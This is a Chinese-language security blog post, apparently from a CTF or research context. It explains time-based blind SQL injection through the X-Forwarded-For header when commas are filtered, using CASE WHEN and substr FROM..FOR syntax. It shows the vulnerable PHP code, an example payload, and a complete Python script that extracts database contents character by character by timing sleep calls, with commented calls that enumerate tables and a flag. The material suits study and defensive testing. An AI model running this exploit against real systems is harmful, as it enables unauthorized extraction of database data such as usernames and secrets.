---
id: 736
layout: post
title: 'sql注入时case when ... then ... else ...end 的应用'
date: 2016-05-13 18:37:00
author: virusdefender
tags: 
---

在基于时间的盲注的时候，一般使用的是if语句，如果符合条件就sleep，但是部分不能使用逗号的场景下，还可以使用`case when #condition then ... else ... end`语句来代替if语句，参考http://dev.mysql.com/doc/refman/5.7/en/control-flow-functions.html。

某开源系统中

```php
$this->ip = mysqli_real_escape_string($mysqli,$_SERVER['REMOTE_ADDR']);
if( !empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ){
    $REMOTE_ADDR = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $tmp_ip=explode(',',$REMOTE_ADDR);
    $this->ip = $tmp_ip[0];
}
```

然后注入点在insert和update语句中。一个盲注场景，没有报错和回显。


<!--more-->


这里在`X-FORWARDED-FOR`中按照逗号分隔取IP，而这个字段是用户可控的，需要不出现逗号，或者第一个逗号之前是完整的payload，所以这里不能使用if了，而是使用case语句代替。

当然mid函数也不能用了，需要替换为`substr($string from $post for $length)`的写法。

如果`$string`是sql语句，那就加一个括号。

然后可以按照 https://virusdefender.net/index.php/archives/590/ 逐步的获取全部数据。

一个例子是`1.1.1.1' and case when ord(substr((select username from db.table limit 1) from 1 for 1))=98 then sleep(2) else 1 end and '1.2.3.4`

![请输入图片描述][1]

最终实现的代码是

```python
# coding=utf-8
import time
import requests


url = "http://example.com/"


def get_info(sql):
    print (sql, )
    for position in range(1, 30):
        for ord in range(32, 127):
            start_time = time.time()
            xff = "1.1.1.1' and case when ord(substr({sql} from {position} for 1))={ord} then sleep(3) else 1 end and '1.2.3.4".format(sql=sql, position=str(position), ord=ord)
            # print(xff)
            r = requests.get(url, headers={"X-FORWARDED-FOR": xff})
            end_time = time.time()
            if end_time - start_time > 2.9:
                print (position, chr(ord))
                break
            # print (position, c)
        else:
            return

#get_info("version()")
#get_info("user()")
#for i in range(2):
#    get_info("(select table_name from information_schema.tables where table_schema='ip_db' limit 1 offset {offset})".format(offset=i))

#get_info("(select column_name from information_schema.columns where table_name='flag' and table_schema='ip_db' limit 1)")
#get_info("(select flag from ip_db.flag limit 1)")

```


  [1]: http://storage.virusdefender.net/blog/images/736/1.jpg